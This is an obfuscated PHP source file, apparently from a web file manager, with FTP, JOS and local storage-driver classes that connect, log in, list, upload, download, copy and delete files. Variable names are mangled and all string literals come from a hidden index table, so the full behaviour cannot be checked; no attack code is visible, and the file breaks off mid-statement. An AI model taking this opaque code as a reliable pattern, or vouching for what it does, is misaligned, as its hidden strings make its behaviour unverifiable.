<?php
 goto D®•èò©´ø; Fôñ ´µ˜ò: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ëù¯ò–¿) { parent::__construct(); if (count($ëù¯ò–¿) > 0) { $this->_init($ëù¯ò–¿); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¢ŠÙ«¶) { $ßÄ‹™ ÷ =& $_SERVER[®»±”ó²]; global $config; $this->appCharset = $config[$ßÄ‹™ ÷[1458]]; $this->systemCharset = $config[$ßÄ‹™ ÷[1459]]; if (isset($¢ŠÙ«¶[$ßÄ‹™ ÷[1460]]) && $¢ŠÙ«¶[$ßÄ‹™ ÷[1460]]) { $this->systemCharset = $¢ŠÙ«¶[$ßÄ‹™ ÷[1460]]; } } public function iconvApp($³ÍÊ‰£¨) { return $this->iconvTo($³ÍÊ‰£¨, $this->systemCharset, $this->appCharset); } public function iconvSystem($÷û–°ŒÛ) { return $this->iconvTo($÷û–°ŒÛ, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÕèÇ¹ı) { $½Ö ‘û§ =& $_SERVER[®»±”ó²]; $ÒŠÚÃò± = $this->iconvApp($this->pathBase); $ÕèÇ¹ı = $this->iconvApp($ÕèÇ¹ı); if (substr($ÒŠÚÃò±, 0, 2) == $½Ö ‘û§[1430]) { $ÒŠÚÃò± = BASIC_PATH . substr($ÒŠÚÃò±, 2); } if (substr($ÕèÇ¹ı, 0, 2) == $½Ö ‘û§[1430]) { $ÕèÇ¹ı = BASIC_PATH . substr($ÕèÇ¹ı, 2); } $ÒŠÚÃò± = KodIO::clear($ÒŠÚÃò±); $ÕèÇ¹ı = KodIO::clear($ÕèÇ¹ı); $ÕèÇ¹ı = substr($ÕèÇ¹ı, strlen($ÒŠÚÃò±)); if (empty($this->pathDriver)) { return $ÕèÇ¹ı; } return $this->pathDriver . $½Ö ‘û§[8] . ltrim($ÕèÇ¹ı, $½Ö ‘û§[8]); } private function _init($£¾‹ªõ = array()) { $ÏÁ¼‹Èì =& $_SERVER[®»±”ó²]; if (!function_exists($ÏÁ¼‹Èì[1461])) { throw new Exception(LNG($ÏÁ¼‹Èì[1462])); } $this->config = $£¾‹ªõ; $this->charsetReset($£¾‹ªõ); foreach ($£¾‹ªõ as $Æ°Œ¸™« => $®ˆ‹¤·) { if (isset($this->{$Æ°Œ¸™«})) { $this->{$Æ°Œ¸™«} = $®ˆ‹¤·; } } return $this->_login($£¾‹ªõ); } private function _login($¹ââ‡Ü¨) { $úò¡©î° =& $_SERVER[®»±”ó²]; static $³Ã—‘½Ë = array(); $éµ­«” = md5(json_encode($¹ââ‡Ü¨)); if (isset($³Ã—‘½Ë[$éµ­«”])) { foreach ($³Ã—‘½Ë[$éµ­«”] as $è†Á€Æ¸ => $Ïóƒ—³) { $this->{$è†Á€Æ¸} = $Ïóƒ—³; } return !0; } $Çºµûş = parse_url(trim($this->server, $úò¡©î°[8])); $this->host = $Çºµûş[$úò¡©î°[209]]; $ù«Õ²æ³ = isset($Çºµûş[$úò¡©î°[208]]) && $Çºµûş[$úò¡©î°[208]] == $úò¡©î°[1463] ? !0 : !1; $this->scheme = $ù«Õ²æ³ ? $úò¡©î°[1464] : $úò¡©î°[1465]; $this->port = isset($Çºµûş[$úò¡©î°[210]]) ? $Çºµûş[$úò¡©î°[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($úò¡©î°[1466]) . $this->host . $úò¡©î°[4] . $this->port, !0); return !1; } $äÁ¤å = @ftp_login($this->connect, $this->username, $this->userpass); if (!$äÁ¤å) { $this->writeLog(LNG($úò¡©î°[1467]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $úò¡©î°[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $àİ×¦£¦ = $this->pasv == $úò¡©î°[91] ? !0 : !1; @ftp_pasv($this->connect, $àİ×¦£¦); $³Ã—‘½Ë[$éµ­«”] = array($úò¡©î°[1468] => $this->connect, $úò¡©î°[209] => $this->host, $úò¡©î°[208] => $this->scheme, $úò¡©î°[210] => $this->port); return $äÁ¤å; } private function _isconn($’óË˜¢£ = true) { if (is_resource($this->connect)) { return !0; } if (!$’óË˜¢£) { return !1; } return $this->_login($this->config); } public function mkfile($Ïúê€Åì, $úÃÕ¥÷² = '', $ÊõĞ†îÎ = REPEAT_RENAME) { if ($this->setContent($Ïúê€Åì, $úÃÕ¥÷²)) { return $this->getPathOuter($Ïúê€Åì); } $this->writeLog(LNG($_SERVER[®»±”ó²][1469]), !0); return !1; } public function mkdir($Öğò–¼õ, $ùÌüè„ı = REPEAT_SKIP) { $Ç®ÄÖ´ã =& $_SERVER[®»±”ó²]; if (!$Öğò–¼õ || $Öğò–¼õ == $Ç®ÄÖ´ã[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Öğò–¼õ = $this->iconvSystem($Öğò–¼õ); if ($this->_isFolder($Öğò–¼õ) || @ftp_mkdir($this->connect, $Öğò–¼õ)) { return $this->getPathOuter($Öğò–¼õ); } if (!$this->mkdir($this->pathFather($Öğò–¼õ))) { return !1; } if ($Öğò–¼õ = @ftp_mkdir($this->connect, $Öğò–¼õ)) { return $this->getPathOuter($Öğò–¼õ); } $‘ÙáÍŞÍ = __FUNCTION__ . $Ç®ÄÖ´ã[1470]; $this->writeLog($‘ÙáÍŞÍ, !0); return !1; } public function copyFile($ˆ«±şˆµ, $¦µ•£Ó’) { if (!$this->_isconn()) { return !1; } $Ù±êªõ¬ = $this->pathThis($this->iconvSystem($ˆ«±şˆµ)); $à°ÑÆÉ„ = $this->tempFile($Ù±êªõ¬); $ÏŞ‹‚ú = $this->iconvApp($à°ÑÆÉ„); $this->download($ˆ«±şˆµ, $ÏŞ‹‚ú); $“÷ö¼¬ = $this->upload($¦µ•£Ó’, $ÏŞ‹‚ú); $this->tempFileRemve($à°ÑÆÉ„); return $“÷ö¼¬; } public function moveFile($·ıŸÉ˜¡, $È•­ÇØ…) { if (!$this->_isconn()) { return !1; } $·ıŸÉ˜¡ = $this->iconvSystem($·ıŸÉ˜¡); $È•­ÇØ… = $this->iconvSystem($È•­ÇØ…); $ ¨½š‚ = @ftp_rename($this->connect, $·ıŸÉ˜¡, $È•­ÇØ…); if (!$ ¨½š‚) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } return $this->getPathOuter($È•­ÇØ…); } public function delFile($àİñ™) { if (!$this->_isconn()) { return !1; } $àİñ™ = $this->iconvSystem($àİñ™); $§À¥Â¯Ş = @ftp_delete($this->connect, $àİñ™); if (!$§À¥Â¯Ş) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); } return $§À¥Â¯Ş; } public function delFolder($é×¿Í×) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¯Ì©©Âö = $‚üÎ›Èå = array(); $this->fileList($é×¿Í×, $¯Ì©©Âö, $‚üÎ›Èå, !0); $this->listItemCache = !0; foreach ($‚üÎ›Èå as $æ§­ö¦É) { $Ú²©½Ç… = $this->iconvSystem($æ§­ö¦É[$_SERVER[®»±”ó²][32]]); $¤ô’íğ = @ftp_delete($this->connect, $Ú²©½Ç…); if (!$¤ô’íğ) { return !1; } } foreach ($¯Ì©©Âö as $Ú²©½Ç…) { $Ú²©½Ç… = $this->iconvSystem($Ú²©½Ç…); $¤ô’íğ = @ftp_rmdir($this->connect, $Ú²©½Ç…); if (!$¤ô’íğ) { return !1; } } $é×¿Í× = $this->iconvSystem($é×¿Í×); return @ftp_rmdir($this->connect, $é×¿Í×); } public function rename($®æÊ¸Î, $ÎÍš¸Åô) { $ºĞÈã¨İ =& $_SERVER[®»±”ó²]; if (!$this->_isconn()) { return !1; } $âÅş¯ßÒ = $this->fileNameAuto($this->pathFather($®æÊ¸Î), $ÎÍš¸Åô); $âÅş¯ßÒ = $this->iconvSystem($âÅş¯ßÒ); $®æÊ¸Î = $this->iconvSystem($®æÊ¸Î); $Õóàô€É = $this->pathFather($®æÊ¸Î); $¦Ã—³Œˆ = rtrim($Õóàô€É, $ºĞÈã¨İ[8]) . $ºĞÈã¨İ[8] . $âÅş¯ßÒ; $¨¦œØ¯¿ = @ftp_rename($this->connect, $®æÊ¸Î, $¦Ã—³Œˆ); if (!$¨¦œØ¯¿) { $this->writeLog(__FUNCTION__ . $ºĞÈã¨İ[1470], !0); return !1; } $¦Ã—³Œˆ = $this->iconvApp($¦Ã—³Œˆ); return $this->getPathOuter($¦Ã—³Œˆ); } private function folderInfo($³Ø„ÅÃÉ, $¨ó ·éâ = false) { $¯äğ€ğ =& $_SERVER[®»±”ó²]; $§ªãÒî = array($¯äğ€ğ[32] => $this->pathThis($³Ø„ÅÃÉ), $¯äğ€ğ[87] => $this->getPathOuter($¯äğ€ğ[8] . $³Ø„ÅÃÉ), $¯äğ€ğ[33] => $¯äğ€ğ[78]); if ($¨ó ·éâ) { return $§ªãÒî; } $§ªãÒî[$¯äğ€ğ[234]] = $§ªãÒî[$¯äğ€ğ[88]] = 0; $§ªãÒî[$¯äğ€ğ[235]] = $§ªãÒî[$¯äğ€ğ[236]] = !0; return $§ªãÒî; } private function fileInfo($ÛÆ©Ë ¶, $ˆäÁ»§‹ = false, $ŠĞ›ßÏ = array()) { $ı¸åİ•œ =& $_SERVER[®»±”ó²]; $±ÓĞøàä = array($ı¸åİ•œ[32] => $this->pathThis($ÛÆ©Ë ¶), $ı¸åİ•œ[87] => $this->getPathOuter($ı¸åİ•œ[8] . $ÛÆ©Ë ¶), $ı¸åİ•œ[33] => $ı¸åİ•œ[233], $ı¸åİ•œ[79] => isset($ŠĞ›ßÏ[$ı¸åİ•œ[79]]) ? $ŠĞ›ßÏ[$ı¸åİ•œ[79]] : 0, $ı¸åİ•œ[169] => $this->ext($ÛÆ©Ë ¶)); if ($ˆäÁ»§‹) { return $±ÓĞøàä; } $±ÓĞøàä[$ı¸åİ•œ[234]] = $±ÓĞøàä[$ı¸åİ•œ[88]] = 0; $±ÓĞøàä[$ı¸åİ•œ[235]] = $±ÓĞøàä[$ı¸åİ•œ[236]] = !0; $¥èà¬ƒç = $this->iconvSystem($ÛÆ©Ë ¶); $±ÓĞøàä[$ı¸åİ•œ[88]] = @ftp_mdtm($this->connect, $¥èà¬ƒç); if (empty($ŠĞ›ßÏ)) { $ŠĞ›ßÏ = $this->objectMeta($ÛÆ©Ë ¶); if (!$ŠĞ›ßÏ) { return $±ÓĞøàä; } } $±ÓĞøàä[$ı¸åİ•œ[79]] = $ŠĞ›ßÏ[$ı¸åİ•œ[79]]; return $±ÓĞøàä; } public function size($€¾Ë†±ñ) { $Í‹æŸ¢™ = $this->objectMeta($€¾Ë†±ñ); return $Í‹æŸ¢™ ? $Í‹æŸ¢™[$_SERVER[®»±”ó²][79]] : 0; } public function info($„µ©çÒ) { if ($this->isFile($„µ©çÒ)) { return $this->fileInfo($„µ©çÒ, 0); } else { if ($this->isFolder($„µ©çÒ)) { return $this->folderInfo($„µ©çÒ); } } return !1; } private function fileList($‘Ä±ú„´, &$Õ‰Ë„•ë, &$‰¯ì¥Ä´, $ü§”à”µ = false) { $¬Úå‚ä¡ =& $_SERVER[®»±”ó²]; $‘Ä±ú„´ = $this->iconvSystem($‘Ä±ú„´); if (!$this->isFolder($‘Ä±ú„´)) { return !1; } $‘Ä±ú„´ = rtrim($‘Ä±ú„´, $¬Úå‚ä¡[8]) . $¬Úå‚ä¡[8]; check_abort(); $û¬å = @ftp_rawlist($this->connect, $‘Ä±ú„´); if (!$û¬å) { $û¬å = array(); } $Ğ‡°³ó† = array($¬Úå‚ä¡[10] => 1, $¬Úå‚ä¡[1375] => 1); foreach ($û¬å as $ûÖ†‘åß) { $ä†­š›Ó = $this->_listItem($ûÖ†‘åß); if ($ä†­š›Ó[0] == $¬Úå‚ä¡[839]) { continue; } $š¬ä®× = $ä†­š›Ó[8]; if (empty($š¬ä®×) && $š¬ä®× !== $¬Úå‚ä¡[231] || isset($Ğ‡°³ó†[$š¬ä®×])) { continue; } $š¬ä®× = $this->iconvApp($‘Ä±ú„´ . ltrim($š¬ä®×, $¬Úå‚ä¡[8])); $”¦íÀ¸Ê = array($¬Úå‚ä¡[32] => $š¬ä®×, $¬Úå‚ä¡[33] => $¬Úå‚ä¡[233], $¬Úå‚ä¡[79] => $ä†­š›Ó[4]); if (substr($ûÖ†‘åß, 0, 1) == $¬Úå‚ä¡[1471]) { $”¦íÀ¸Ê[$¬Úå‚ä¡[33]] = $¬Úå‚ä¡[78]; $”¦íÀ¸Ê[$¬Úå‚ä¡[79]] = 0; } $³¤„Ëâ‘ = $”¦íÀ¸Ê[$¬Úå‚ä¡[33]] == $¬Úå‚ä¡[78] ? !0 : !1; $this->cacheMethodInfoSet($š¬ä®×, $³¤„Ëâ‘, $”¦íÀ¸Ê); if ($³¤„Ëâ‘) { $Õ‰Ë„•ë[] = $š¬ä®×; if ($ü§”à”µ) { $this->fileList($š¬ä®×, $Õ‰Ë„•ë, $‰¯ì¥Ä´, $ü§”à”µ); } continue; } $‰¯ì¥Ä´[] = $”¦íÀ¸Ê; } $this->cacheMethodInfoSet($‘Ä±ú„´, !0); } private function _listItem($Ğ£¢…Õö) { if (empty($Ğ£¢…Õö)) { return array(); } $»úÅ¦¹ = preg_split($_SERVER[®»±”ó²][1472], $Ğ£¢…Õö); if (count($»úÅ¦¹) <= 9) { return $»úÅ¦¹; } $»úÅ¦¹[8] = trim(substr($Ğ£¢…Õö, strpos($Ğ£¢…Õö, $»úÅ¦¹[7]) + strlen($»úÅ¦¹[7]))); return array_splice($»úÅ¦¹, 0, 9); } public function listPath($½ªŠÓ±Ê, $ûÓÖ¤÷ = false) { $½î‘÷â =& $_SERVER[®»±”ó²]; if (!$this->_isconn()) { return !1; } $ÎûíÛíĞ = $èÀ‹€¨ = array(); $this->fileList($½ªŠÓ±Ê, $ÎûíÛíĞ, $èÀ‹€¨); foreach ($ÎûíÛíĞ as $û÷Ôæëª => $ãƒ£¶Û£) { $ÎûíÛíĞ[$û÷Ôæëª] = $this->folderInfo($ãƒ£¶Û£, $ûÓÖ¤÷); } foreach ($èÀ‹€¨ as $û÷Ôæëª => $ãƒ£¶Û£) { $èÀ‹€¨[$û÷Ôæëª] = $this->fileInfo($ãƒ£¶Û£[$½î‘÷â[32]], $ûÓÖ¤÷, $ãƒ£¶Û£); } return array($½î‘÷â[85] => $ÎûíÛíĞ, $½î‘÷â[86] => $èÀ‹€¨); } public function has($Ğ­•İ×û, $”»î¢à = false, $²ÊŞ¹Ç = true) { $í©‚²åª =& $_SERVER[®»±”ó²]; $ø™°¬‘¾ = $†êÔÃºô = array(); $¹±ÀÛ¨ô = $”»î¢à ? !0 : !1; $this->fileList($Ğ­•İ×û, $ø™°¬‘¾, $†êÔÃºô, $¹±ÀÛ¨ô); if ($”»î¢à) { return array($í©‚²åª[242] => count($†êÔÃºô), $í©‚²åª[243] => count($ø™°¬‘¾)); } if ($²ÊŞ¹Ç) { if (count($†êÔÃºô)) { return !0; } } else { if (count($ø™°¬‘¾)) { return !0; } } return !1; } public function listAll($é´±³ê²) { $×õĞÖÀù =& $_SERVER[®»±”ó²]; if (!$this->_isconn()) { return !1; } $ÇÍ¦¨Ó = $úÇçáÇ = array(); $this->fileList($é´±³ê², $ÇÍ¦¨Ó, $úÇçáÇ, !0); $¯œßóâ‡ = array_to_keyvalue($úÇçáÇ, $×õĞÖÀù[32]); foreach ($ÇÍ¦¨Ó as $®ğªÌğ¥) { if (is_string($®ğªÌğ¥)) { $¯œßóâ‡[$®ğªÌğ¥] = array($×õĞÖÀù[79] => 0); } } return $this->listAllFiles($é´±³ê², $¯œßóâ‡); } public function getContent($Šïù±’ş) { if (!$this->_isconn()) { return !1; } $Šïù±’ş = $this->iconvSystem($Šïù±’ş); return $this->fileSubstr($Šïù±’ş); } public function setContent($íÎ¶¡¸ì, $µ³‚ğ‹® = '') { if (!$this->_isconn()) { return !1; } $ÎË¡õÏ = $this->pathThis($this->iconvSystem($íÎ¶¡¸ì)); $İçÂÈû¨ = $this->tempFile($ÎË¡õÏ); file_put_contents($İçÂÈû¨, $µ³‚ğ‹®); $ÁÜ­—€í = $this->upload($íÎ¶¡¸ì, $this->iconvApp($İçÂÈû¨)); $this->tempFileRemve($İçÂÈû¨); return $ÁÜ­—€í; } public function fileSubstr($êÛÅÙ, $î³óòÎ = 0, $×“™úúÎ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($êÛÅÙ, $î³óòÎ, $×“™úúÎ); } private function ftpRequest($ª›ø•É³, $ÓËÈĞ = 0, $¯Ø±êŠé = false) { $®æ÷ËÜ‹ =& $_SERVER[®»±”ó²]; $ª›ø•É³ = $®æ÷ËÜ‹[8] . ltrim(str_ltrim($ª›ø•É³, $this->ftpPath), $®æ÷ËÜ‹[8]); $ª›ø•É³ = $this->iconvSystem($ª›ø•É³); $›Ø—Ÿª = $this->scheme . $this->host . $®æ÷ËÜ‹[4] . $this->port; $èĞ¤¦»‰ = curl_init(); curl_setopt($èĞ¤¦»‰, CURLOPT_URL, $›Ø—Ÿª . $this->pathEncode($ª›ø•É³)); curl_setopt($èĞ¤¦»‰, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¯Ø±êŠé) { $ÌãüÜ›… = $ÓËÈĞ + $¯Ø±êŠé - 1; curl_setopt($èĞ¤¦»‰, CURLOPT_RANGE, "{$ÓËÈĞ}\55{$ÌãüÜ›…}"); } curl_setopt($èĞ¤¦»‰, CURLOPT_RETURNTRANSFER, 1); $÷ö‹ = curl_exec($èĞ¤¦»‰); curl_close($èĞ¤¦»‰); return $÷ö‹; } public function upload($°¢ºà•„, $—ˆ˜èŒà, $¼³Ìùê = false, $³Ğ¥¡¸ì = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($°¢ºà•„))) { return !1; } $°¢ºà•„ = $this->iconvSystem($°¢ºà•„); $—ˆ˜èŒà = $this->iconvSystem($—ˆ˜èŒà); $­˜ØæõÎ = ftp_nb_put($this->connect, $°¢ºà•„, $—ˆ˜èŒà, FTP_BINARY); while ($­˜ØæõÎ == FTP_MOREDATA) { $­˜ØæõÎ = ftp_nb_continue($this->connect); } if ($­˜ØæõÎ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } return $this->getPathOuter($°¢ºà•„); } public function download($ÄºèîÄã, $–¯ö¦àß = '') { if (!$this->_isconn()) { return !1; } $Š¥¥…‰ˆ = $this->pathFather($–¯ö¦àß); if (!IO::mkdir($Š¥¥…‰ˆ)) { return !1; } $ÄºèîÄã = $this->iconvSystem($ÄºèîÄã); $–¯ö¦àß = $this->iconvSystem($–¯ö¦àß); $¨öºé¸œ = ftp_nb_get($this->connect, $–¯ö¦àß, $ÄºèîÄã, FTP_BINARY); while ($¨öºé¸œ == FTP_MOREDATA) { $¨öºé¸œ = ftp_nb_continue($this->connect); } if ($¨öºé¸œ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } return $this->iconvApp($–¯ö¦àß); } public function exist($üë±ÔÆ•) { return $this->isFile($üë±ÔÆ•) || $this->isFolder($üë±ÔÆ•); } public function isFile($¬¿óÄî) { return !$this->isFolder($¬¿óÄî) && $this->objectMeta($¬¿óÄî); } public function isFolder($°Á”Ùò ) { return $this->cacheMethod($_SERVER[®»±”ó²][180], $°Á”Ùò ); } protected function objectMeta($¢èÛÜŠ¸) { return $this->cacheMethod($_SERVER[®»±”ó²][182], $¢èÛÜŠ¸); } protected function _objectMeta($±³ç¿”) { $°ºß¯ƒÙ =& $_SERVER[®»±”ó²]; if ($±³ç¿” == $°ºß¯ƒÙ[12] || $±³ç¿” == $°ºß¯ƒÙ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $±³ç¿” = $this->iconvSystem($±³ç¿”); $É‚÷­˜ = array($°ºß¯ƒÙ[32] => $this->iconvApp($±³ç¿”), $°ºß¯ƒÙ[33] => $°ºß¯ƒÙ[233], $°ºß¯ƒÙ[79] => 0); $Àé´Ë«¥ = @ftp_size($this->connect, $±³ç¿”); if ($Àé´Ë«¥ != -1) { $É‚÷­˜[$°ºß¯ƒÙ[79]] = $Àé´Ë«¥; } else { $ş´Á®ÁÊ = @ftp_chdir($this->connect, $±³ç¿”); if (!$ş´Á®ÁÊ) { return !1; } @ftp_chdir($this->connect, $°ºß¯ƒÙ[8]); $É‚÷­˜[$°ºß¯ƒÙ[33]] = $°ºß¯ƒÙ[78]; } return $É‚÷­˜; } protected function _isFolder($²şíÙÄî) { $Æş˜˜²§ =& $_SERVER[®»±”ó²]; if ($²şíÙÄî == $Æş˜˜²§[12] || $²şíÙÄî == $Æş˜˜²§[8]) { return !0; } $¤øñ‰¯Ó = $this->_objectMeta($²şíÙÄî); return isset($¤øñ‰¯Ó[$Æş˜˜²§[33]]) && $¤øñ‰¯Ó[$Æş˜˜²§[33]] == $Æş˜˜²§[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($–×›Áı˜) { parent::__construct($–×›Áı˜); $this->setSignVersion($_SERVER[®»±”ó²][250]); } public function uploadLink($¿ŠÕñ”í, $êüÀ‰ò = 0) { $ë€®¢…ñ =& $_SERVER[®»±”ó²]; if ($this->isUploadServer()) { return; } $ˆÓ”üÄÍ = $this->getType(); if (!in_array($ˆÓ”üÄÍ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ƒœÚ†å = (!$êüÀ‰ò ? 1 : ceil($êüÀ‰ò / pow(1024, 3))) * 3600 * 4; $ê¬·ºÉ· = $this->uploadMultiData($¿ŠÕñ”í, $ƒœÚ†å); if ($ê¬·ºÉ·) { $ê¬·ºÉ·[$ë€®¢…ñ[97]] = $¿ŠÕñ”í; $ê¬·ºÉ·[$ë€®¢…ñ[98]] = $ˆÓ”üÄÍ; } return $ê¬·ºÉ·; } public function fileOutImage($µ¡œÇ‘, $½‘šÂ‡÷ = 250) { if ($this->size($µ¡œÇ‘) > 1024 * 1024 * 25) { return $this->fileOutImageServer($µ¡œÇ‘, $½‘šÂ‡÷); } $„÷õüíÎ = $this->link($µ¡œÇ‘); $„÷õüíÎ .= $_SERVER[®»±”ó²][1473] . $½‘šÂ‡÷; $this->fileOutLink($„÷õüíÎ); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($è ƒáÀ) { if (substr($è ƒáÀ, 0, 2) == $_SERVER[®»±”ó²][1430]) { $è ƒáÀ = BASIC_PATH . substr($è ƒáÀ, 2); } return $è ƒáÀ; } public function iconvApp($ìÆŸ„îİ) { $³’ˆ’â =& $_SERVER[®»±”ó²]; global $config; return $this->iconvTo($ìÆŸ„îİ, $config[$³’ˆ’â[1459]], $config[$³’ˆ’â[1458]]); } public function iconvSystem($¦“·‡÷•) { $Ã‰ø’ôƒ =& $_SERVER[®»±”ó²]; global $config; return $this->iconvTo($¦“·‡÷•, $config[$Ã‰ø’ôƒ[1458]], $config[$Ã‰ø’ôƒ[1459]]); } public function getPathOuter($±ó«¬¡¨) { $Ì·Á®åş =& $_SERVER[®»±”ó²]; $Ò˜ç°ş = $this->iconvApp($this->pathBase); $±ó«¬¡¨ = $this->iconvApp($±ó«¬¡¨); if (substr($Ò˜ç°ş, 0, 2) == $Ì·Á®åş[1430]) { $Ò˜ç°ş = BASIC_PATH . substr($Ò˜ç°ş, 2); } if (substr($±ó«¬¡¨, 0, 2) == $Ì·Á®åş[1430]) { $±ó«¬¡¨ = BASIC_PATH . substr($±ó«¬¡¨, 2); } $Ò˜ç°ş = KodIO::clear($Ò˜ç°ş); $±ó«¬¡¨ = KodIO::clear($±ó«¬¡¨); $±ó«¬¡¨ = substr($±ó«¬¡¨, strlen($Ò˜ç°ş)); if (empty($this->pathDriver)) { return $±ó«¬¡¨; } return $this->pathDriver . $Ì·Á®åş[8] . ltrim($±ó«¬¡¨, $Ì·Á®åş[8]); } public function mkfile($‰Á²£Ç×, $Ÿé½Şá» = '', $ñÃù®õü = REPEAT_RENAME) { $‰Á²£Ç× = $this->iconvSystem($‰Á²£Ç×); @touch($‰Á²£Ç×); if ($Ÿé½Şá») { file_put_contents($‰Á²£Ç×, $Ÿé½Şá»); } @chmod($‰Á²£Ç×, $this->pathAuth); if (is_file($‰Á²£Ç×)) { return $this->getPathOuter($‰Á²£Ç×); } $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } public function mkdir($¨¡ğ±¹ , $Ê¡ãÀ = REPEAT_SKIP) { $¨¡ğ±¹  = $this->iconvSystem($¨¡ğ±¹ ); if (is_dir($¨¡ğ±¹ )) { return $this->getPathOuter($¨¡ğ±¹ ); } @mkdir($¨¡ğ±¹ , $this->pathAuth, !0); @chmod($¨¡ğ±¹ , $this->pathAuth); if (is_dir($¨¡ğ±¹ )) { return $this->getPathOuter($¨¡ğ±¹ ); } $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } public function copyFile($©‹§¯Õ‹, $Ğé‹ÛŒÑ) { $this->mkdir($this->pathFather($Ğé‹ÛŒÑ)); $©‹§¯Õ‹ = $this->iconvSystem($©‹§¯Õ‹); $Ğé‹ÛŒÑ = $this->iconvSystem($Ğé‹ÛŒÑ); $İ×û°¼„ = copy_64($©‹§¯Õ‹, $Ğé‹ÛŒÑ); @chmod($Ğé‹ÛŒÑ, $this->pathAuth); if ($İ×û°¼„) { return $this->getPathOuter($Ğé‹ÛŒÑ); } $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } public function moveFile($¯¤â—ù, $€ÉÏ¦¬‘) { $this->mkdir($this->pathFather($€ÉÏ¦¬‘)); $¯¤â—ù = $this->iconvSystem($¯¤â—ù); $€ÉÏ¦¬‘ = $this->iconvSystem($€ÉÏ¦¬‘); $”ùİü¤ß = intval(@rename($¯¤â—ù, $€ÉÏ¦¬‘)); if (!$”ùİü¤ß) { if ($”ùİü¤ß = intval(@copy_64($¯¤â—ù, $€ÉÏ¦¬‘))) { @unlink($¯¤â—ù); } } @chmod($€ÉÏ¦¬‘, $this->pathAuth); if ($”ùİü¤ß) { return $this->getPathOuter($€ÉÏ¦¬‘); } $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } public function movePath($Ì‚ı¢Ÿò, $‡¥Ë¹˜˜, $¶¢äôÀ— = false) { $¼ï„Šş =& $_SERVER[®»±”ó²]; $Ì‚ı¢Ÿò = $this->iconvSystem($Ì‚ı¢Ÿò); $‡¥Ë¹˜˜ = $this->iconvSystem($‡¥Ë¹˜˜); $‰ÕÆçœâ = rtrim($‡¥Ë¹˜˜, $¼ï„Šş[8]) . $¼ï„Šş[8] . ($¶¢äôÀ— ? $¶¢äôÀ— : get_path_this($Ì‚ı¢Ÿò)); if (file_exists($‰ÕÆçœâ)) { return !1; } $İÄŠç¯ü = intval(@rename($Ì‚ı¢Ÿò, $‰ÕÆçœâ)); $İÄŠç¯ü = file_exists($‰ÕÆçœâ); if ($İÄŠç¯ü) { return $this->getPathOuter($‰ÕÆçœâ); } $this->writeLog(__FUNCTION__ . $¼ï„Šş[1470], !0); return !1; } public function delFile($½øñÕÀ´) { $½øñÕÀ´ = $this->iconvSystem($½øñÕÀ´); if (!@unlink($½øñÕÀ´)) { @chmod($½øñÕÀ´, $this->pathAuth); if (@unlink($½øñÕÀ´)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[®»±”ó²][1470], !0); return !1; } return !0; } public function delFolder($É‡ª°‚) { $Œ´—İ÷ì =& $_SERVER[®»±”ó²]; $É‡ª°‚ = $this->iconvSystem($É‡ª°‚); if (!is_dir($É‡ª°‚)) { return !0; } if (!($ŸÁ®ÛêÈ = opendir($É‡ª°‚))) { return !1; } while (($ğşÓé˜¾ = readdir($ŸÁ®ÛêÈ)) !== !1) { if ($ğşÓé˜¾ == $Œ´—İ÷ì[10] || $ğşÓé˜¾ == $Œ´—İ÷ì[1375]) { continue; } $¸«¹¤‘ = $É‡ª°‚ . $Œ´—İ÷ì[8] . $ğşÓé˜¾; if (is_file($¸«¹¤‘) || is_link($¸«¹¤‘)) { if (!unlink($¸«¹¤‘)) { chmod($¸«¹¤‘, $this->pathAuth); if (!unlink($¸«¹¤‘)) { return !1; } } } else { if (is_dir($¸«¹¤‘)) { chmod($¸«¹¤‘, $this->pathAuth); $¸«¹¤‘ = $this->iconvApp($¸«¹¤‘); if (!$this->delFolder($¸«¹¤‘)) { return !1; } } } } closedir($ŸÁ®ÛêÈ); return rmdir($É‡ª°‚); } public function rename($£ÖâÓõƒ, $æÏıÙ–Á) { $›ş¾ ‰Ï =& $_SERVER[®»±”ó²]; $ùÒÏÚÓÄ = $this->fileNameAuto($this->pathFather($£ÖâÓõƒ), $æÏıÙ–Á); $ùÒÏÚÓÄ = $this->iconvSystem($ùÒÏÚÓÄ); $£ÖâÓõƒ = $this->iconvSystem($£ÖâÓõƒ); $ŸÉ×¹İ = $this->pathFather($£ÖâÓõƒ); $òÈ³³‹ = rtrim($ŸÉ×¹İ, $›ş¾ ‰Ï[8]) . $›ş¾ ‰Ï[8] . $ùÒÏÚÓÄ; $¬¯Å®Ÿ = @rename($£ÖâÓõƒ, $òÈ³³‹); $òÈ³³‹ = $this->iconvApp($òÈ³³‹); if 